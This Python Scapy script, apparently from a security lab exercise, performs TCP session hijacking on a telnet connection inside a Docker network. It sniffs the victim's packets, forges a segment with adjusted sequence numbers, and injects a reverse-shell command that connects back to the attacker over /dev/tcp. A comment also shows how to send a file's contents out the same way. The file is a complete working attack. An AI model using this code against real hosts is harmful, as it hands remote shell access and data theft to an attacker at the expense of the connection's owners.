#!/usr/bin/env python3
from scapy.all import *

# the following three lines are used to automatically get the name of the interface used for docker
# if it does not work, you can simply set it manually
import subprocess
cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()


attacker_ip = "10.9.0.1" # attacker's IP
attacker_port = 9090 # a (not already used) port of your choice
victim_ip = "10.9.0.6" # the IP of the user receiving the telnet connection (server)

REVERSE_SHELL = f"\r/bin/bash -i > /dev/tcp/{attacker_ip}/{attacker_port} 0<&1 2>&1\r"

"""
Task 4: Creating Reverse Shell using TCP Session Hijacking

1) Set the information of your attacker machine at the begin of this file
2) Start a listener in your attacker machine using netcat (nc -lv <port>)
3) Start the telnet connection and log in
4) Run this tool on the attacker machine
5) Press a key in the telnet server to generate a random packet to sniff in the attacker machine

Instead of creating a reverse shell, you can also execute a specific command.
For instance, you can read a file using something like: 
    \rcat /path/to/file > /dev/tcp/{attacker_ip}/{attacker_port}\r
"""
def automatic_hijacking():
    print("*** Hijacking Automatic Mode ***")
    print("Start sniffing...")
    sniff(iface=IFACE, filter="tcp", prn=_hijacking)


def _hijacking(pkt):
    if pkt[IP].src==victim_ip and Raw in pkt:
        print("Got a starting of a session, hijacking... ", end="")
        # you have to get the size of the data field to update SEQ and ACK.
        # this value is generally 1 since telnet sends one character at the time
        # but sometimes it is different (for instance, 2, if also \r is sent)
        tcp_seg_len = len(pkt.getlayer(Raw).load)

        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
        tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq+tcp_seg_len, ack=pkt[TCP].ack+tcp_seg_len)
        data = REVERSE_SHELL # use this to create a full reverse shell
        pkt = ip/tcp/data
        send(pkt, iface=IFACE, verbose=0)
        print("done.")
        exit(0)


if __name__ == "__main__":
    automatic_hijacking()
